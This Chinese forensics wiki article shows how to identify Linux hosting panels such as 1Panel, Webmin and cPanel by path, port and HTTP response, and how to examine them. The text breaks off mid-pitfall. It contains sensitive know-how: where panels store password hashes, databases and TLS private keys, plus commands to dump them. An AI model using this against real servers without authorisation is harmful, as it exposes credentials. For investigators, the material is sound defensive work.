---
title: "其他管理面板取证"
slug: "server-panel-hosting-control-panel-forensics"
canonical: "https://www.digiforensics.cn/wiki/server-panel-hosting-control-panel-forensics"
license: "CC-BY-SA-4.0"
author: "DigiForensics"
updated_at: "2026-10-09T12:51:51+08:00"
source_url: null
references: ["https://creativecommons.org/licenses/by-sa/4.0/deed.zh-hans"]
source_type: "wiki-sync"
category: "server"
space: "服务器与云取证"
node_path: ["面板与控制台"]
---

# 其他管理面板取证

<a id="section-1"></a>

## 一、概述

宝塔之外，Linux 服务器上还有大量其他管理面板。

它们的共性是：**一个 Web 口令 = 一次 root 级操作**。取证逻辑与宝塔完全一致——查「谁在什么时候用过面板」，再查「面板替谁保管了哪些凭据」。

但不同面板的差异极大，混用路径会直接导致结论错误，典型错误是**「认错面板」**：在 1Panel 的机器上去找 `/www/server/panel`，什么都不会命中，于是把「存在但路径不同」写成了「不存在」。

本篇因此把目标定在两件事上：**一张能快速认面板的对照表**（目录、数据库、日志、默认端口），以及**一套不依赖面板类型的通用识别方法**——即使遇到没见过的面板，也能从端口、HTTP 响应、报错信息、文件系统残留里认出它来。

**在取证流程中的位置**：本篇属于**识别层**，位于「服务器上到底装了什么」这个问题之前或之中。它与 [宝塔面板取证](server-panel-bt-panel-forensics.md) 不是替代关系——宝塔取证路径明确，值得单独一篇；本篇负责剩下的一切，并给出通用方法。上游依赖 [Linux 服务器取证工件地图](server-panel-linux-server-artifact-map.md) 的路径全景；下游是针对识别出的面板做具体分析（配置、日志、凭据），以及与站点侧的衔接。

**涉及的证据形态**（面板对照表，完整版含技术栈见 2.1）：

| 面板 | 主目录 | 配置/数据库 | 主要日志 | 默认端口 |
|---|---|---|---|---|
| **宝塔 BT Panel** | `/www/server/panel/` | `data/default.db`（旧）/ `data/db/*.db`（新） | `logs/request.log` | **8888**（旧版 888） |
| **1Panel** | `/opt/1panel/` | `db/1Panel.db`（SQLite） | `log/`、`logs/`（**随版本变化**） | **10086** |
| **Webmin** | `/etc/webmin/`、`/usr/share/webmin/` | `users.pl`、`webmin.config`（**Perl 序列化**） | `/var/log/webmin/` | **10000** |
| **Usermin** | `/etc/usermin/` | `users.pl` | `/var/log/usermin/` | **20000** |
| **aaPanel** | `/www/server/panel/` | 与宝塔同源（英文版分支） | `logs/request.log` | **8888** |
| **cPanel / WHM** | `/usr/local/cpanel/` | `main.db`（SQLite）、`vars/` | `/var/log/cpanel/` | **2082/2083** |
| **DirectAdmin** | `/usr/local/directadmin/` | `admin.conf` | `/var/log/directadmin/` | **2222** |
| **Plesk** | `/usr/local/psa/` | `plesk.db` | `/var/log/plesk/` | **8443/8880** |
| **Cockpit** | `/etc/cockpit/` | `cockpit.conf` | journald | **9090** |

> ⚠️ **版本差异必须现场确认**，逐项说明见 2.1 面板对比表。

**两类特殊结构必须单独讲**：

- **1Panel 是容器化的**——面板本体是一个容器，Web 应用也是独立容器。**日志可能不在宿主机文件系统上**；离线镜像上通常只能看到宿主机层，容器数据在 `/var/lib/docker/volumes/` 里。取证时**必须区分「宿主机」与「容器」两层**（见 [Docker 取证工件地图](../server-docker/server-docker-docker-artifact-map.md)）。
- **Webmin 用 Perl 序列化配置**——`users.pl` 不是文本也不是 SQLite，用文本编辑器打开是乱码。**不能把「打开是乱码」当成「文件已加密」。**

**通用识别方法**，四类线索：

**HTTP 响应特征**（最可靠，404 页面里出现面板自己的产品名是最直接的确认方式）。

**报错信息**（高，实际办案中**一条错误信息直接暴露面板类型**）。

**端口指纹**（线索而非证据——端口可改、可反代、必须交叉验证）。

**文件系统存在性**（离线镜像可靠，但单一目录存在只能说明「装过」，**不能说明「当前在用」**）。

**多条线索同时命中同一面板时，才能做出认定。** 建议按 [3.1 第 1 步](#section-9) 普查后再用 [3.2 第 2 步](#section-10) 区分状态。

由此要回答的问题：这台服务器上装的是哪个面板（或装了哪几个）、版本与架构大致如何、面板的配置与凭据存在哪、面板当前是否在运行、日志在哪；面板里具体发生过什么操作（要读它的日志，格式随版本与面板类型变化）；某个面板的完整加密机制（宝塔新版见 [宝塔新版加密数据解密](server-panel-bt-panel-encrypted-data.md)，其他面板各不相同）。其中两条判据必须先立住：**「装过」不等于「在用」**（面板可能已卸载但残留目录）；**配置打不开时不能一律写「已加密」**——可能是格式没认对。

**内容边界**：本文用于**已获得合法授权**的取证场景。**面板配置中含真实凭据，提取分析须在受控环境内完成**，报告中脱敏。识别面板时只做**存在性测试与被动观察**，不触发面板的漏洞利用，不尝试绕过认证。

**读者前提**：需要 [Linux 服务器取证工件地图](server-panel-linux-server-artifact-map.md) 的路径全景与面板基础概念、[宝塔面板取证](server-panel-bt-panel-forensics.md) 的取证逻辑（**本篇的多处判读标准以宝塔篇为对照**），以及基本的 HTTP 与端口知识。建议先做 [3.1 第 1 步](#section-9) 的普查，再决定按哪个面板展开。
<a id="section-2"></a>

## 二、核心原理

<a id="section-3"></a>

### 2.1 面板对比表

**这张表先用「存在性测试」逐项过一遍，命中哪项就是哪个面板。**

| 面板 | 主目录 | 配置/数据库 | 主要日志 | 默认端口 | 技术栈 |
|---|---|---|---|---|---|
| **宝塔 BT Panel** | `/www/server/panel/` | `data/default.db`（旧）<br>`data/db/*.db`（新） | `logs/request.log` | **8888**（旧版 888） | Python |
| **1Panel** | `/opt/1panel/` | `db/1Panel.db`（SQLite） | `log/`、`logs/`（**随版本变化**） | **10086**（可自定义） | Go |
| **Webmin** | `/etc/webmin/`（配置）<br>`/usr/share/webmin/`（程序） | `users.pl`、`webmin.config`（**Perl 序列化**） | `/var/log/webmin/` | **10000** | Perl |
| **Usermin** | `/etc/usermin/` | `users.pl` | `/var/log/usermin/` | **20000**（可自定义） | Perl |
| **aaPanel** | `/www/server/panel/` | 与宝塔同源（英文版分支） | `logs/request.log` | **8888** | Python |
| **cPanel / WHM** | `/usr/local/cpanel/` | `main.db`（SQLite）、`vars/` | `/var/log/cpanel/` | **2082/2083**（2087/2088 强制 SSL） | Perl |
| **DirectAdmin** | `/usr/local/directadmin/` | `admin.conf` | `/var/log/directadmin/` | **2222** | C |
| **Plesk** | `/usr/local/psa/` | `plesk.db` | `/var/log/plesk/` | **8443/8880** | PHP |
| **Cockpit** | `/etc/cockpit/` | `cockpit.conf` | journald（`systemd-journald`） | **9090** | C/Python |
| **小皮面板（Windows 为主）** | Linux 版少见 | — | — | **888**（Windows 环境） | — |

> ⚠️ **版本差异必须现场确认**。上表中 1Panel 的日志目录尤其不稳定：不同版本出现过 `log/`、`logs/`、甚至只输出到容器日志的情况。判定时以「目录是否存在」为准，不要只按表里的名字 `ls` 一次就断定没装。

<a id="section-4"></a>

### 2.2 1Panel 的特殊性：容器化

1Panel 与其他面板最大的结构差异是**它以 Docker 容器为核心**：面板本体是一个容器，Web 应用（OpenResty、MySQL、Redis 等）也是独立容器。

这带来两个取证影响。

**其一，日志可能不在宿主机文件系统上。**

```bash
docker ps -a --format 'table {{.Names}}\	{{.Image}}\	{{.Status}}'
docker logs 1panel 2>&1 | tail -100        # V1 容器名
docker logs 1panel-v2 2>&1 | tail -100     # V2 容器名
ls -l /opt/1panel/log/  /opt/1panel/logs/  2>/dev/null
```

**其二，取证时必须区分「宿主机」与「容器」两层。**在离线镜像上通常只能看到宿主机层，容器数据在 `/var/lib/docker/volumes/` 里（若使用命名卷）：

| 位置 | 内容 |
|---|---|
| `/opt/1panel/db/1Panel.db` | **面板主数据库**（SQLite），含账号、设置、数据库信息 |
| `/opt/1panel/conf/` | 各应用的配置（Nginx、PHP、数据库等） |
| `/opt/1panel/apps/` | 通过面板安装的应用（OpenResty 等）及其配置 |
| `/opt/1panel/log/` 或 `logs/` | 面板自身日志（版本相关） |
| `/var/lib/docker/volumes/` | 容器命名卷（应用数据可能在此） |

<a id="section-5"></a>

### 2.3 Webmin 的特殊性：Perl 序列化配置

Webmin 不使用 SQLite，而使用 Perl 的 `Storable`/`Data::Dumper` 序列化格式。

这意味着**不能直接用文本编辑器或 SQLite 工具读**，必须用 Perl 解析：

```bash
# 直接 cat 会看到 $VAR1 = {...}; 这类内容
perldump /mnt/df/etc/webmin/users.pl
```

`/etc/webmin/` 下的关键文件：

| 文件 | 内容 | 取证价值 |
|---|---|---|
| `miniserv.conf` | **主配置**：端口、监听地址、`allow`/`deny` IP 白名单、TLS 设置 | ★★★★★ |
| `users.pl` | Webmin 用户到 Unix 账户的映射与权限 | ★★★★★ |
| `webmin.config` | 全局配置（Perl 序列化） | ★★★★ |
| `ssl/` | 证书与私钥（**取证的敏感目标**） | ★★★★★ |
| `/` 下各模块配置 | 各模块的独立配置目录 | ★★★ |
| `/usr/share/webmin/` | 程序本体（判断是否被篡改的比对基线） | ★★★ |

`miniserv.conf` 的取证价值最高，因为 `allow=` 行直接回答「谁被允许访问面板」：

```
port=10000
listen=0.0.0.0
ssl=1
allow=203.0.113.0/24      ← 只有这个网段被允许
```

若 `allow` 为空或为 `0.0.0.0/0`，说明**未设置访问限制**，是重要风险项。

**日志位置**（不同安装方式略有差异）：

```bash
ls -l /var/log/webmin/ 2>/dev/null
# miniserv.log   ← 服务端访问日志
# auth.log       ← 认证日志（登录成败）
# webmin.log     ← 操作日志（需在 Webmin 配置里开启"记录每个操作的文件改动"）
```

> **关键陷阱**：`webmin.log`（操作日志）**默认不开启**。未开启时不存在「没有操作记录」的结论——而是「从未记录过」。这两个说法的证据价值完全不同。

<a id="section-6"></a>

### 2.4 aaPanel 与国产面板概览

aaPanel 是宝塔的**国际版分支**，代码同源，因此目录结构、数据库位置、日志位置、默认端口全部相同。

差异在于界面语言、安装包来源，以及**部分模块的默认配置**。取证时按宝塔处理即可，但要注意区分「装了 aaPanel」和「装了宝塔中文版」——可通过面板文件中的语言包目录或安装记录判断。

| 面板 | 平台 | 特点与取证注意 |
|---|---|---|
| **宝麒麟** | Linux | 国产面板，取证参照宝塔思路，路径以实际安装为准 |
| **悬镜** | Linux | 偏向安全加固的运维平台，配置目录随版本变化 |
| **小皮面板** | **Windows 为主** | 国内常见的 Windows 建站面板；**Linux 版本极少**，遇到 Linux 服务器时不应优先假设 |
| **AMH** | Linux | 开源面板，PHP 实现，目录与数据库路径随版本变化 |
| **定制开发面板** | 视情况 | 无通用路径，**只能靠实际样本逐一识别** |

> **诚实说明**：国产面板（尤其定制版）没有稳定的取证路径资料。上表只列识别思路，**具体路径必须以实际样本验证**。遇到未知面板时，用 2.5 节的通用方法。

<a id="section-7"></a>

### 2.5 通用识别方法（不依赖已知面板）

即使遇到没听过的面板，也能从以下四类线索认出它。

**方法一：端口指纹**

| 端口线索 | 指向 |
|---|---|
| 8888 / 888 | 宝塔 / aaPanel / 小皮 |
| 10086 | 1Panel（较常见） |
| 10000 | Webmin（默认） |
| 20000 | Usermin（默认） |
| 9090 | Cockpit |
| 2222 | DirectAdmin |
| 2082/2083/2087/2088 | cPanel / WHM |
| 8443 / 8880 | Plesk |

> **注意**：端口是**线索不是证据**。端口可改、可反代、可能与其他服务冲突。**必须与目录/响应头/进程名交叉验证。**

**方法二：HTTP 响应特征（最可靠）**

如果目标还在运行，直接访问可疑端口看响应（`curl -skI https://127.0.0.1:8888 | head -20`）：

| 响应特征 | 指向 |
|---|---|
| 响应头带 `X-Powered-By: BT-Panel` 一类标识 | 宝塔 |
| `Set-Cookie` 名为 `1panel_session` 一类 | 1Panel |
| 页面标题/页脚含 `Webmin` | Webmin |
| **404 页面里出现面板自己的版权/产品名** | **最直接的确认方式** |

**方法三：一条报错信息往往就够**

实际办案中，经常是**一条错误信息直接暴露了面板类型**：

| 报错/线索 | 判断 |
|---|---|
| 404 页面脚注「Powered by 1Panel」 | 1Panel |
| 500 错误堆栈里出现 `webmin_ajax` / `miniserv.pl` | Webmin |
| 日志路径 `/www/server/panel/logs/error.log` 出现在报错里 | 宝塔/aaPanel |
| 提示「请访问 http://<IP>:8888/xxx 安全入口」 | 宝塔（安全入口机制独有） |

**方法四：文件系统存在性（离线镜像的可靠方式）**——见 3.1。

**多条线索同时命中同一面板时，才能做出认定。**单一目录存在只能说明「装过」，不能说明「当前在用」——面板可能已卸载但残留目录。

本篇只覆盖面板这一类工件。服务器上还有哪些日志、站点目录与系统痕迹需要一并固定，见[第 01 篇](server-panel-linux-server-artifact-map.md)。

---

<a id="section-8"></a>

## 三、操作步骤

<a id="section-9"></a>

### 3.1 第 1 步：面板存在性普查

```bash
for d in /www/server/panel /opt/1panel /etc/webmin /etc/usermin \
         /usr/local/cpanel /usr/local/directadmin /usr/local/psa \
         /etc/cockpit /opt/cockpit; do
  [ -d "/mnt/df$d" ] && echo "命中  $d"
done
ls /mnt/df/etc/systemd/system/ 2>/dev/null | grep -iE 'panel|webmin|1panel|cockpit'
ss -tulpn | grep LISTEN          # 在线时的端口
```

<a id="section-10"></a>

### 3.2 第 2 步：判定"装过"还是"在用"

**这是本篇强调的一个关键区分**，很多案件在这里出错的根源：

```bash
# 1) 配置文件是否完整且近期被修改
ls -l --time-style=long-iso /mnt/df/etc/webmin/miniserv.conf 2>/dev/null
# 2) 数据库是否近期被写入（应用层活动痕迹）
ls -l --time-style=long-iso /mnt/df/opt/1panel/db/1Panel.db 2>/dev/null
# 3) 日志的最后一条记录时间
tail -3 /mnt/df/var/log/webmin/miniserv.log 2>/dev/null
# 4) 面板程序本体是否完整（可能被删了程序留了配置）
ls /mnt/df/www/server/panel/class/ 2>/dev/null | head
```

| 观察 | 结论 |
|---|---|
| 目录 + 程序 + 近期日志 | **在用**（按在用取证） |
| 目录 + 程序存在，但日志早已停止 | 装过但已停用（仍可能被攻击者重新启用） |
| 只有配置和数据库，程序目录为空 | **被卸载但数据残留——数据本身仍是高价值证据** |
| 目录完全不存在 | 未安装（**注意区分「从未装过」与「装完即删」**） |

<a id="section-11"></a>

### 3.3 第 3 步：1Panel 取证

先完整复制并固定哈希，再只读打开 SQLite（**不要用 `sqlite3` 直接写镜像路径**）：

```bash
cp -rp /mnt/df/opt/1panel /evidence/1panel/
find /evidence/1panel -type f -exec sha256sum {} + | tee /evidence/1panel-hashes.txt
sqlite3 "file:/evidence/1panel/db/1Panel.db?mode=ro" ".tables"
```

| 检查项 | 取证意义 |
|---|---|
| `users` 表 | 面板账号列表，是否有陌生账户 |
| `settings` 中的入口/端口 | 面板访问地址与端口 |
| 数据库/应用记录 | 1Panel 集中管理凭据，**是本机最集中的敏感信息源** |
| `conf/` 下各应用配置 | 实际生效的应用配置（比面板记录更可信） |
| `/var/lib/docker/volumes/` | 容器命名卷（应用数据可能在此） |

**注意**：1Panel 的表名随版本变化，`SELECT * FROM users` 若报错应先看 `.schema`，**不要假设表名**。

<a id="section-12"></a>

### 3.4 第 4 步：Webmin 取证

```bash
cp -rp /mnt/df/etc/webmin /evidence/webmin-etc/
find /evidence/webmin-etc -type f -exec sha256sum {} + | tee /evidence/webmin-hashes.txt
grep -E '^(port|listen|ssl|allow|deny|logfile)' /mnt/df/etc/webmin/miniserv.conf
perldump /mnt/df/etc/webmin/users.pl 2>/dev/null | head -40
ls -l /mnt/df/etc/webmin/ssl/ 2>/dev/null      # 证书与私钥（高价值目标）
```

`miniserv.conf` 的 `allow=` 行为空即高危；`users.pl` 需用 Perl 反序列化工具解析（`perldump`，或核心模块 `Data::Dumper`），直接 `cat` 是乱码。

<a id="section-13"></a>

### 3.5 第 5 步：通用识别流程与资产汇总

```bash
# 1) 端口 → 候选面板；2) 逐个端口试探响应（在线时）
for p in 8888 10086 10000 20000 9090 2222 2083 8443; do
  echo "== $p"; curl -skI --max-time 3 "https://127.0.0.1:$p" 2>/dev/null | head -5
  curl -sI  --max-time 3 "http://127.0.0.1:$p"  2>/dev/null | head -5
done
# 3) 从文件系统反查该端口属于谁
grep -rlE ':8888|:10086|:10000' /mnt/df/etc/ /mnt/df/www/ 2>/dev/null | head -20
# 4) 报错信息与日志路径交叉
grep -rlE 'panel|webmin|1panel' /mnt/df/var/log/*.log 2>/dev/null | head
# 5) 站点资产汇总
ls -d /mnt/df/www/wwwroot/*/ /mnt/df/var/www/*/ 2>/dev/null | tee /evidence/site-summary.txt
```

**交叉验证矩阵**（至少两条线索一致才认定）：

| 线索 | 端口 | 目录 | 响应特征 | 结论强度 |
|---|---|---|---|---|
| 只命中目录 | — | ✓ | — | 弱（只说明装过） |
| 目录 + 端口 | ✓ | ✓ | — | 中（装过且当前监听） |
| 目录 + 端口 + 响应头含面板标识 | ✓ | ✓ | ✓ | **强（可认定）** |

汇总后再做交叉检查：

| 检查 | 异常含义 |
|---|---|
| 两个面板同时存在 | 可能一个被攻击者安装来开后门 |
| 面板数据库有记录但站点目录不存在 | 站点被删，数据库残留 |
| 站点目录存在但无任何面板记录 | 绕过面板手工部署（可疑） |
| 面板 `allow`/白名单为空或全开 | 高危配置，是入侵的前置条件 |

---
<a id="section-14"></a>

## 四、常见陷阱

其他面板取证的陷阱，集中在两个方向：**认错对象**（路径张冠李戴）和**状态误判**（存在/在用/无日志三种状态被混为一谈）。

本篇要反复强调的判据纪律是：端口是线索不是证据，目录存在只说明装过，日志缺失要先分清「未开启」还是「被清理」。

本章按「识别与认定 → 格式与状态判读 → 结论与跨机关联」三段归组。

<a id="section-15"></a>

### 4.1 识别与认定

<a id="section-16"></a>

#### 陷阱 1：★ 用另一款面板的路径去查，得出「没装面板」

**现象**：拿到一台机器，按熟悉的路径挨个试：`/www/server/panel`（宝塔）、`/www/server/panel/data/db/`、`/www/wwwroot`，全都没有，报告写「该服务器未安装管理面板」。

**原因**：**面板之间的路径几乎没有交集。**

1Panel 在 `/opt/1panel/`、Webmin 的配置在 `/etc/webmin/`、Cockpit 在 `/etc/cockpit/`、Plesk 在 `/usr/local/psa/`——宝塔的路径在 1Panel 机器上当然找不到，而 1Panel 的路径在宝塔机器上也当然找不到。

更麻烦的是**残留目录会制造反向误判**：卸载过的面板会留下空的配置目录，你看到 `/etc/webmin/` 存在就以为在用。

**影响**：**整条面板取证线被跳过。**

而面板是「一个 Web 口令 = 一次 root 级操作」的入口，漏掉它意味着丢失了这类案件里**最直接的入侵入口证据**。案例中运维称「没装过面板」，而实际命中 `/etc/webmin`——如果只按熟悉路径找，这个矛盾就永远发现不了。

**核查**：先跑存在性普查（3.1 的目录循环 + systemd unit + 端口），再针对性分析。存在性普查必须覆盖全部已知路径，且**以「目录是否存在」为唯一判据，不预设装了哪款**。

三项都无命中时，报告的限定写法见陷阱 12——**「未命中已知路径」不等于「未安装」**，可能存在没见过的定制面板。

<a id="section-17"></a>

#### 陷阱 2：只看端口就定性面板类型

**现象**：在线时 `ss -tulpn` 看到 `0.0.0.0:10000` 有监听，报告写「该服务器运行 Webmin，监听默认端口 10000」。

**原因**：**端口是线索，不是证据。** 它可以改（`miniserv.conf` 里 `port=` 随便改）、可以反代（面板藏在 443 后面）、可以与其他服务冲突（8888 同时可能是宝塔、小皮、或某个自研后台），而且**很多服务默认就用这些端口**。

端口号与面板的对应是**统计意义上的常见**，不是绑定关系。

**影响**：**认证了一个错误的面板类型**，于是按错误的面板去查它根本不存在的位置，得到的全是空结果。

案例里 `curl` 试探 10000 端口看到的是 Webmin 的响应头——**那是响应特征给出的，不是端口给的**。

**核查**：**至少两条独立线索交叉才认定，且组合越强结论越硬**，三档判读与 3.5 的交叉验证矩阵一致。离线镜像上没有响应特征时，**只能给出「疑似」**，并把「响应特征未验证」写进局限。

**端口可反代这一条要特别提示**：面板前面挂 CDN 或 SLB 时，实际入口端口与面板自身端口可以完全不同。

<a id="section-18"></a>

#### 陷阱 3：把「目录存在」当「面板在用」

**现象**：发现 `/etc/webmin/` 存在且 `users.pl` 可读，报告写「该服务器运行 Webmin，攻击者通过它登录」。

**原因**：**卸载面板不会删干净配置目录**，尤其是被攻击者用完就清理的场景。

判定「在用」需要**应用层活动痕迹**，而不是目录存在——至少看四项：

① 配置文件近期是否被修改。

② **面板数据库近期是否被写入**（这是应用层活动最直接的痕迹，`1Panel.db` 的 mtime）。

③ **日志的最后一条记录时间**。

④ **程序本体是否完整**（只有配置和数据库、程序目录为空 = 被卸载但数据残留）。

**影响**：**「装过」被当成「在用」**，于是把一个三个月前就停用的面板的旧日志当成本案证据——**日志里的可疑 IP 和时间可能与本案毫无关系**。

这类张冠李戴比漏查更隐蔽，因为它看起来有证据支撑。

**核查**：**用 3.2 第 2 步的四项证据分档，并把档位写进报告**。判定为「已停用」时，所有基于它的结论都必须标注「该面板当前未运行，日志反映的是历史状态」。

<a id="section-19"></a>

#### 陷阱 4：在 Linux 服务器上优先假设小皮面板

**现象**：因为「国内建站常用小皮」，在 Linux 机器上优先按小皮的路径和习惯去找，或报告里写「该站点使用小皮面板管理」。

**原因**：小皮面板是 Windows 为主的面板，Linux 版本极少。

国内用户量大这个事实反映的是**大量 Windows 服务器**，不反映 Linux 环境。在 Linux 机器上优先假设小皮，会让人跳过 `/opt/1panel`、`/etc/webmin` 这些真正更可能命中的路径。

**影响**：**优先级错配导致漏查**，同时在报告里写下一个没有依据的判断。

**核查**：**按平台先筛一遍候选集**。

Linux 上的常见面板是宝塔/aaPanel、1Panel、Webmin/Usermin、Cockpit、cPanel、Plesk、DirectAdmin。**Windows 环境才优先考虑小皮**（Windows 侧的完整处理见 Windows 板块）。

遇到 Linux 上「像是国产定制面板」的痕迹，用 2.5 节的通用方法识别，**不要因为「国产面板路径不确定」就跳过**——**未知面板同样要查，只是路径靠通用方法反推**。

<a id="section-20"></a>

### 4.2 格式与状态判读

<a id="section-21"></a>

#### 陷阱 5：用文本工具读 `users.pl`，得出「用户库损坏」

**现象**：`cat /etc/webmin/users.pl` 出来是 `$VAR1 = {...};` 这类内容，分析员据此写「该文件已损坏，无法读取用户信息」。

**原因**：**这不是损坏，是格式。**

Webmin / Usermin / cPanel 这一系都用 Perl 的 `Storable`（`Data::Dumper`）序列化格式存储配置——它是 Perl 变量的内存转储形式，本来就是给 Perl 解释器 `eval` 回去的，不是给人看的文本。

直接 `cat` 看到的是数据结构的序列化结果，信息完整，只是需要一个 Perl 解释器才能还原成结构。

**影响**：唯一能回答「Webmin 有哪些账户」的证据被写成「损坏不可用」，而这个账户列表正是判断「攻击者是新建账户还是破解了现有账户」的关键——案例里 `users.pl` 中只有 `root`，直接支撑了「没有创建新账户，而是破解了 root 口令」这个结论。丢了它，攻击路径就说不清。

**核查**：用 `perldump`（由 **`Data::Dump`** 这个独立 Perl 包提供，需单独安装 `perl-Data-Dump`）解析，它会把 Perl 序列化结构还原成可读形式。**注意 `perldump` 不是核心模块 `Data::Dumper` 自带的**——`Data::Dumper` 只提供 API，没有 `perldump` 命令，装了它也跑不出这个命令。若目标机没装，用核心模块手工解析同样可行：

```bash
perl -MData::Dumper -e 'do "/mnt/df/etc/webmin/users.pl"; print Dumper($users);'
```

实测该写法能正确还原出 `$users` 的哈希结构（`Data::Dumper` 是核心模块，无需额外安装）。**`file` 命令先判类型再选工具**——SQLite 用 `sqlite3`、Perl 序列化用 `perldump` 或 `Data::Dumper`、MySQL dump 用文本工具，**工具选错时报的错往往长得像「文件坏了」**。另外 `users.pl` 里的口令是**哈希**（案例中是 `$1$` 开头，即 MD5-crypt 格式），不是明文——见陷阱 9。

<a id="section-22"></a>

#### 陷阱 6：把 `webmin.log` 缺失写成「无操作记录」

**现象**：`/var/log/webmin/` 下只有 `miniserv.log` 和 `auth.log`，没有 `webmin.log`，报告写「未发现面板操作记录」。

**原因**：`webmin.log`（记录每个操作及其文件改动的操作日志）默认不开启，必须在 Webmin 配置里显式启用「记录每个操作的文件改动」才会有。

所以文件不存在**不是没有发生过操作，而是从未记录过操作**。这两个说法的证据价值完全不同——前者是阴性发现，后者是取证能力缺失。

**影响**：**把「从未记录」写成「没有发生」**，委托方会认为攻击者登录后只做了登录、没做任何事。

实际上案例里登录后编辑了 `/etc/crontab`、开了 Web Shell 终端——**只是这些操作没有被记录下来**。这个误判会让入侵范围被严重低估。

**核查**：报告里写「操作日志未开启（文件不存在，`miniserv.log` 与 `auth.log` 存在），面板操作无法从操作层还原**，只能从服务访问日志的 URL 序列推断」**。然后做力所能及的替代分析：① `miniserv.log` 里的 URL 序列本身能刻画行为链（案例里 `/proc/index_tree.cgi` → `/file/show.cgi?/etc/crontab` → `/file/edit.cgi?/etc/crontab` → `/shell/index.cgi` 就是完整链）；② **与服务访问日志之外的结果层交叉**——`/etc/crontab` 的 mtime 与 `edit.cgi` 请求时间吻合，构成双源印证；③ **把这条证据缺口明确写进报告**，并作为安全建议（面板应开启操作日志）交给委托方。

<a id="section-23"></a>

#### 陷阱 7：用 `sqlite3` 打开非 SQLite 的配置文件

**现象**：对所有面板的配置文件统一用 `sqlite3 xxx.db ".tables"` 试探，某几个返回 `file is not a database`，于是判断「这几个面板的数据库已损坏」。

**原因**：面板的存储格式本来就各不相同。宝塔、1Panel、cPanel、Plesk 落在 SQLite 上，`file` 会直接报 `SQLite 3.x database`；Webmin 和 Usermin 是 Perl 序列化；DirectAdmin 只有一个 `admin.conf`；Cockpit 也只配一个 `cockpit.conf`。

同一句 `file is not a database`，`sqlite3` 会对任何非 SQLite 文件都吐出来。它描述的是你选错了工具，不是文件坏了。

**影响**：「格式不匹配」被写成「证据损坏」，这条证据随后就被跳过。DirectAdmin 的 `admin.conf`、Cockpit 的 `cockpit.conf` 都是明文配置，读出来就是完整信息。因为工具选错而放弃，是纯粹的损失。

**核查**：**先 `file` 判类型，再选工具**，顺序与工具映射见陷阱 5。真的判断不了，就把文件头几行十六进制 dump 出来看魔数，多数格式一眼就分得开。

在换过工具之前，「工具报错」不构成「文件损坏」的结论。

<a id="section-24"></a>

#### 陷阱 8：1Panel 只查宿主机层，漏掉容器卷

**现象**：在 1Panel 机器上查到 `/opt/1panel/db/1Panel.db` 有账户和数据库记录，报告写「已获取该机全部数据库资产」，但没看 `/var/lib/docker/volumes/`。

**原因**：1Panel 以 Docker 容器为核心。面板本体是容器，OpenResty、MySQL、Redis 各自也是独立容器。

真正的数据库文件和站点文件躺在命名卷里，不在 `/opt/1panel/`。只查宿主机层，拿到的只是控制面元数据。

还有一层容易漏：日志可能只输出到容器 stdout，也就是 `docker logs` 才能看到，宿主机上根本没有对应文件。

**影响**：「资产清单」名不副实。列出了数据库名，却拿不到数据文件，也无法确认数据是否已被导出或加密。应用层的数据访问行为整段缺失。

**核查**：**把容器层当成独立一层查。**

宿主机层看两样：面板数据库、配置文件。

容器层看三样：`/var/lib/docker/volumes/` 下的命名卷，**数据就在这里**；容器的 `config.v2.json`，用它确认哪个卷对应哪个应用；`docker logs` 的输出，如果日志驱动不是 `json-file`，宿主机上本来就不会有文件。

离线镜像上容器层通常可见，`/var/lib/docker` 整体在镜像里，具体解析方法见[Docker 取证](../server-docker/server-docker-docker-artifact-map.md)。

报告里要分清两件事：「面板记录了哪些数据库」是元数据，「在卷里找到了哪些数据文件」才是数据。混成一句就废了。

<a id="section-25"></a>

### 4.3 结论表述与跨机关联

<a id="section-26"></a>

#### 陷阱 9：从用户库读出哈希就当成知道口令

**现象**：`users.pl` 里看到 `password => '$1$...`，据此写「已获取 Webmin root 口令」。

**原因**：**这是哈希，不是口令。**

`$1$` 是 MD5-crypt，也就是 `crypt()` 的传统格式标记，后面跟的是盐值加哈希值。它没法直接拿去登录。想验证就得做离线字典或者掩码攻击，那是另一个合规敏感动作，**必须强调授权、最小化、脱敏**。

`1Panel.db` 里的口令字段、新版宝塔的 `BT-0x:` 密文，同样都不是明文。

**影响**：「拿到哈希」被当成「拿到凭据」，报告的结论强度跟着被高估。更糟的是有人为了「确认」就去爆破哈希——没有明确授权，这一步就越界了。

**核查**：**把三种状态分开写。**

明文可得的情况（旧版宝塔的 `databases.password`、1Panel 某些版本的明文口令），写「已获取明文口令（已脱敏保管）」。

拿到哈希的情况（`$1$`、`$6$` 等），写「仅获取口令哈希，无法直接登录，未进行破解」。

拿到密文的情况（`BT-0x:`），按[第 03 篇](server-panel-bt-panel-encrypted-data.md)处理。

破解口令哈希属于需要单独授权的动作，且要遵循最小化原则。多数情况下，账户列表加上登录成功的时间和 IP 就足以定性了，不需要知道口令本身。

<a id="section-27"></a>

#### 陷阱 10：把「失败 N 次后成功」直接写成「暴力破解」

**现象**：`auth.log` 里某 IP 有 47 次 `login failed` 后接 1 次 `login successful`，报告直接定性「攻击者暴力破解了 root 口令」。

**原因**：失败次数多，不等于爆破。成因至少有四种。

真的爆破或撞库，是一个 IP 在短时间内大量失败。口令复用是用户自己忘了口令，试了几次就成了。自动化工具在枚举用户会先试错口令，发现账户存在后就换策略。会话过期或 CSRF 也会让表单被重发。

**判据不是次数，是「失败—成功」的时间分布与模式。**爆破的失败间隔规整，且集中在极短时间窗内。用户自己重试通常只有 2–3 次，间隔还长——案例里 `web01` 就是 2 次即成功。

**影响**：初始访问方式的判断错了，整条入侵叙事的起点就错了。

爆破指向「口令强度不足」，复用或撞库指向「口令在别处泄露」。这两者对应的整改措施完全不同。案例里 `web02` 的 47 次失败和 `web01` 的 2 次成功放在一起对比，正是区分两种方式的关键发现。

**核查**：**看时间分布，不看次数总量。**

把全部失败和成功的时间戳列出来算间隔。失败集中在一个时间窗内、间隔规整，倾向爆破。失败很少或仅 1–2 次即成功，倾向口令复用或撞库——这时该去找口令来源：其他系统的泄露、其他面板的同一口令、配置文件里的明文。

**并且把这个判断写成有依据的推断，而不是断言。**比如「47 次失败集中在 22:30:11–22:41:02，间隔 3–8 秒，高度规律，符合自动化爆破特征」。依据摆出来，读者才能评估这个结论站不站得住。

<a id="section-28"></a>

#### 陷阱 11：把「跨机时间接近」直接当成同一攻击者

**现象**：两台服务器的日志里，同一个 IP 在相近时间（差 5 秒）都登录成功，报告写「同一次攻击」。

**原因**：时间接近加上 IP 相同，仍然可能不是同一个人。

